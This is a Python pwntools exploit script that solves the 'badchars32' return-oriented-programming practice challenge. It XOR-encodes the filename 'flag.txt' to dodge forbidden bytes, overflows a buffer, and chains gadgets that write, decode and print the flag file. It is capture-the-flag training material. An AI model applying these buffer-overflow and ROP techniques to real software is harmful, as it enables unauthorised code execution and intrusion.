from pwn import *

p = process("./badchars32")
elf = context.binary = ELF('./badchars32', checksec=False)
print("PID ",p.pid)
pause()

pop_esi_edi_ebp_ret = 0x080485b9
mov_edi_esi_ret = 0x0804854f
data_area = 0x0804a018
print_file = 0x80483d0

xor_ebp_ebx_ret = 0x08048547
pop_ebp_ret = 0x080485bb
pop_ebx_ret = 0x0804839d


#encode

badchars = ['x', 'g', 'a', '.']
xor_byte = 0x1
flag = "flag.txt"
flag_file = ""
while 1:
    for f in flag:
        f = ord(f) ^ xor_byte
        print("XOR ->",f)
        if chr(f) in badchars:
            xor_byte += 1
            break
        else:
            flag_file += chr(f)
            print("FLAG CHR -> ",flag_file)
    if len(flag_file) == 8:
        break
print(flag_file)


#xor check flag.txt
for i in flag_file:
    i = ord(i) ^ xor_byte
    print("i = ",chr(i))


p.recvuntil("> ")

payload = b"A"*44

payload += p32(pop_esi_edi_ebp_ret)
payload += flag_file[:4].encode()
payload += p32(data_area)
payload += p32(0x0)
payload += p32(mov_edi_esi_ret)

payload += p32(pop_esi_edi_ebp_ret)
payload += flag_file[4:8].encode()
payload += p32(data_area+0x4)
payload += p32(0x0)
payload += p32(mov_edi_esi_ret)

write_flagfile  = 0
for i in range(len(flag_file)):
    payload += p32(pop_ebp_ret)
    payload += p32(data_area + i)
    payload += p32(pop_ebx_ret)
    payload += p32(xor_byte)
    payload += p32(xor_ebp_ebx_ret)

payload += p32(print_file)
payload += p32(0x0)
payload += p32(data_area)

p.sendline(payload)

p.interactive()

"""
OFFSET
- rop 1 -
pop3ret
flag_file[:4]
data_area
0x0
mov_dword_ptr_edi_ebp_ret

- rop 2 -
pop3ret
flag_file[4:8]
data_area+0x4
0x0
mov_dword_ptr_edi_ebp_ret

- xor-
for loop
    write_flagfile = pop_ebp_ret
    write_flagfile += data_area + i
    write_flagfile += pop_ebx_ret
    write_flagfile += xor_byte
    write_flagfile += xor_ebp_ebx_ret
print_file
0
data_area
"""
